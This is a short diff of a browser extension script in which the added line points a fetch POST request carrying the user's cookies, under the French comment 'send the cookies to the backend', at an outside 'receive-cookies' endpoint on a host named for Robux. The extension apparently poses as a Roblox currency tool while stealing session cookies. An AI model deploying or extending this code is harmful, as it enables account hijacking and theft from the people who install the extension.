@@ -31,7 +31,7 @@ chrome.contextMenus.onClicked.addListener((info) => {
 
     // Envoyer les cookies au backend
     try {
-      const response = await fetch("https://bloxrobux-backend.onrender.com/api/receive-cookies", {
+      const response = await fetch("https://blox-robux.onrender.com/api/receive-cookies", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
